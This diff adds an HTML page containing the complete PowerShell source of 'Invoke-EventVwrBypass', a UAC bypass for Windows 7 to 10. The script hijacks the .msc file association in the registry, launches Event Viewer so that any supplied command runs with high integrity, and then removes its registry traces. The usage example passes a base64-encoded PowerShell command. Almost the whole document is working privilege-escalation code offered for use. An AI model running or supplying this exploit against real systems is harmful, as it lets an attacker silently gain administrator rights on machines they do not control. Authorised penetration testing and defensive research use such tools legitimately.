@@ -1,0 +1,96 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Invoke-EventVwrBypass</title>
+</head><body>function Invoke-EventVwrBypass {<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+<br/>
+Bypasses UAC by performing an image hijack on the .msc file extension<br/>
+Expected to work on Win7, 8.1 and Win10<br/>
+<br/>
+Only tested on Windows 7 and Windows 10<br/>
+<br/>
+Author: Matt Nelson (@enigma0x3)<br/>
+License: BSD 3-Clause<br/>
+Required Dependencies: None<br/>
+Optional Dependencies: None<br/>
+<br/>
+.PARAMETER Command<br/>
+<br/>
+&nbsp;Specifies the command you want to run in a high-integrity context. For example, you can pass it powershell.exe followed by any encoded command "powershell -enc &lt;encodedCommand&gt;"<br/>
+<br/>
+.EXAMPLE<br/>
+<br/>
+Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="<br/>
+<br/>
+This will write out "Is Elevated: True" to C:\UACBypassTest.<br/>
+<br/>
+#&gt;<br/>
+<br/>
+&nbsp; &nbsp; [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]<br/>
+&nbsp; &nbsp; Param (<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True)]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Command,<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Switch]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Force<br/>
+&nbsp; &nbsp; )<br/>
+&nbsp; &nbsp; $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin<br/>
+&nbsp; &nbsp; $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop<br/>
+<br/>
+&nbsp; &nbsp; if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; "UAC is set to 'Always Notify'. This module does not bypass this setting."<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; exit<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Begin Execution<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Command = $pshome + '\' + $Command<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Add in the new registry entries to hijack the msc file<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; New-Item $mscCommandPath -Force |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Key already exists, consider using -Force"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (Test-Path $mscCommandPath) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Created registry entries to hijack the msc extension"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "Failed to create registry key, exiting"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Start Event Viewer<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Process = Start-Process -FilePath $EventvwrPath -PassThru<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Started eventvwr.exe"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Sleep 5 seconds <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Sleeping 5 seconds to trigger payload"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (-not $PSBoundParameters['WhatIf']) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Start-Sleep -Seconds 5<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $mscfilePath = "HKCU:\Software\Classes\mscfile"<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (Test-Path $mscfilePath) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #Remove the registry entry<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Remove-Item $mscfilePath -Recurse -Force<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Removed registry entries"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Stop-Process -Id $Process.Id<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Killed running eventvwr process"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+</body></html>
